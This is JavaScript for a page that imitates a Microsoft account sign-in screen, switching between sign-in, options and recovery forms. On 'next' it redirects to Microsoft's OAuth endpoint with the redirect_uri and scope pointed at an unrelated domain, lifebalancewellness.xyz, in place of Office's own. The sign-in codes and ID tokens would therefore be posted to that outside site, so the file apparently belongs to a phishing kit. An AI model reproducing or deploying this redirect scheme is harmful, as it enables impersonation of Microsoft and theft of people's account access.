
document.querySelector(".sign-in-options-back-btn").addEventListener("click", ()=>{
    document.querySelector("#form2").style.left = "150%"
    document.querySelector("#form1").style.left = "50%"
})

function returnBackToSignInScreen(){
    document.querySelector("#form1").style.left = "50%"
    document.querySelector("#form3").style.left = "150%"
}

document.querySelector(".sign-in-options").addEventListener("click", ()=>{
    document.querySelector("#form1").style.left = "-50%"
    document.querySelector("#form2").style.left = "50%"
})

document.querySelector(".sign-in-to-org").addEventListener("click", ()=>{
    document.querySelector("#form2").style.left = "150%"
    document.querySelector("#form1").style.left = "50%"
})

document.querySelector(".next-btn").addEventListener("click", ()=> {
    if(document.querySelector("input").value === ""){
        console.log(document.querySelector("#form1 .error-text").style)
        document.querySelector("#form1 .error-text").style.display = "block"
    }else{
        window.location.href = "https://login.live.com/oauth20_authorize.srf?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&scope=openid+profile+https%3a%2f%2fwww.lifebalancewellness.xyz%2fv2%2fOfficeHome.All&redirect_uri=https%3a%2f%2fwww.lifebalancewellness.xyz%2flandingv2&response_type=code+id_token&state=tX0wR9Drw3hpOiiwJBJg8Bz1VviumxtxKtx5yTAjj3St0K_ejCVTR_Y-hv_ZhTIGZ1OD4I7UkEhVPuqi7E9mhKsYxUhW0zgn0fZA_biJ0VPSaYVCUUeyC8DTTSg1kFmmIetu003RKnRQFVyhZspXA7nQh6GWbOc5VY067PniXOd303-5WkRooFALkbGANRWk0eJC71B73fK9Hlfr1j_u99_qM4On39tpeUzx1rTZQCuWX9EEvR_EHNJ9BBzCQKSYJEc7echNLstMWUXTJEc_Hg&response_mode=form_post&nonce=638303056579345853.YjkyYmMxOTEtYzIxNi00NjBkLTk0ZmYtYjc0MGIwZGJmYjI4NjA4MzNjYWEtMjlmZi00MmE1LWJmZWQtZTgwMzU4NzRlYmY2&x-client-SKU=ID_NET6_0&x-client-Ver=6.30.1.0&uaid=d9cbbf1ad8ce428bbd8aeb9d8f76b2b8&msproxy=1&issuer=mso&tenant=common&ui_locales=en-US&epct=PAQABAAEAAAAtyolDObpQQ5VtlI4uGjEP8o3Y3yhpYSxEIXNOGVROwJOSY4xNExseBBMSz2VSKEXAXWBU16mrRg4_sEjsV5VmZFdqw35WIo5mQVrXECQmOo9rd1jt2QrdJaKqbCvaizeubuJEuB8VBnZTpN-j2qIcIdmRo8WY3j9xxFBRAMUERbIi_Wjrot_owX_ehVQ9-Din8TwvlJa0t0vQoVSYpMQHcCpOoJz9y1dZYfRxfPc-pCAA&jshs=0&username=test%40outlook.com&login_hint=test%40outlook.com"
    }
})

document.querySelector(".cant-access-acct-btn").addEventListener("click", ()=>{
    document.querySelector("#form1").style.left = "-50%"
    document.querySelector("#form3").style.left = "50%"
})

